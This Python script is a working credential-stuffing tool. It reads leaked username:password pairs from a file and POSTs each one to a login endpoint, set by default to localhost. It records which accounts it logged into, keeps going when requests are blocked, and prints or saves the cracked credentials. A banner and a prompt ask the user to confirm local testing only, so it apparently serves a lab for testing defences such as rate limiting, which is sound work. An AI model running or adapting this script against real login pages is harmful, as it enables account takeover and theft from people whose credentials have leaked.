"""
Credential Stuffing Attack Simulation
Tests username:password pairs from leaked credential databases
"""
import requests
import time
import argparse
import json
from datetime import datetime

TARGET_URL = "http://localhost:5000/login"

def print_banner():
    print("=" * 60)
    print("  CREDENTIAL STUFFING ATTACK SIMULATOR")
    print("  WARNING: For authorized testing only!")
    print("=" * 60)
    print()

def run_attack(credentials_path, verbose=False, delay=0):
    """
    Execute credential stuffing attack

    Args:
        credentials_path: Path to credentials file (username:password format)
        verbose: Print each attempt
        delay: Delay between requests in seconds
    """
    results = {
        "attack_type": "credential_stuffing",
        "attempts": 0,
        "success": 0,
        "blocked": 0,
        "failed": 0,
        "start_time": time.time(),
        "cracked_accounts": []
    }

    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Credentials: {credentials_path}")
    print(f"[*] Starting attack at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()

    try:
        with open(credentials_path, 'r') as f:
            credentials = [line.strip() for line in f if line.strip() and ':' in line]
    except FileNotFoundError:
        print(f"[ERROR] Credentials file not found: {credentials_path}")
        return results

    for cred in credentials:
        try:
            username, password = cred.split(':', 1)
        except ValueError:
            if verbose:
                print(f"[SKIP] Invalid format: {cred}")
            continue

        results["attempts"] += 1

        try:
            response = requests.post(
                TARGET_URL,
                data={"username": username, "password": password},
                timeout=5
            )

            if response.status_code == 200 or 'dashboard' in response.url:
                results["success"] += 1
                results["cracked_accounts"].append({"username": username, "password": password})
                if verbose:
                    print(f"[SUCCESS] ✓ {username}:{password}")
                else:
                    print(f"[+] Account compromised: {username}")

            elif response.status_code in [429, 403]:
                results["blocked"] += 1
                if verbose:
                    print(f"[BLOCKED] ✗ {username} - Attack blocked")
                # Continue trying other accounts even if one is blocked

            else:
                results["failed"] += 1
                if verbose:
                    print(f"[FAIL] {results['attempts']:4d} | {username}:{password}")

        except requests.exceptions.RequestException as e:
            if verbose:
                print(f"[ERROR] Request failed for {username}: {e}")
            results["failed"] += 1

        if delay > 0:
            time.sleep(delay)

    results["end_time"] = time.time()
    results["duration_sec"] = results["end_time"] - results["start_time"]

    return results

def save_results(results):
    """Save attack results to file"""
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"results/credential_stuffing_{timestamp}.json"

    with open(filename, 'w') as f:
        json.dump(results, f, indent=2)

    print(f"\n[*] Results saved to: {filename}")

def print_summary(results):
    """Print attack summary"""
    print("\n" + "=" * 60)
    print("  ATTACK SUMMARY")
    print("=" * 60)
    print(f"Attack Type:       {results['attack_type']}")
    print(f"Total Attempts:    {results['attempts']}")
    print(f"Successful:        {results['success']}")
    print(f"Failed:            {results['failed']}")
    print(f"Blocked:           {results['blocked']}")
    print(f"Duration:          {results['duration_sec']:.2f} seconds")
    print(f"Success Rate:      {(results['success']/results['attempts']*100) if results['attempts'] > 0 else 0:.2f}%")

    if results['cracked_accounts']:
        print(f"\nCompromised Accounts ({len(results['cracked_accounts'])}):")
        for acc in results['cracked_accounts']:
            print(f"  - {acc['username']}:{acc['password']}")

    print("=" * 60)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Credential Stuffing Attack Simulator")
    parser.add_argument("-c", "--credentials", required=True, help="Credentials file (username:password)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between requests (seconds)")
    parser.add_argument("--save", action="store_true", help="Save results to file")

    args = parser.parse_args()

    print_banner()

    # Confirm local testing
    confirm = input("Confirm this is LOCAL TESTING ONLY (yes/no): ")
    if confirm.lower() != 'yes':
        print("Attack cancelled.")
        exit(0)

    results = run_attack(args.credentials, args.verbose, args.delay)
    print_summary(results)

    if args.save:
        save_results(results)
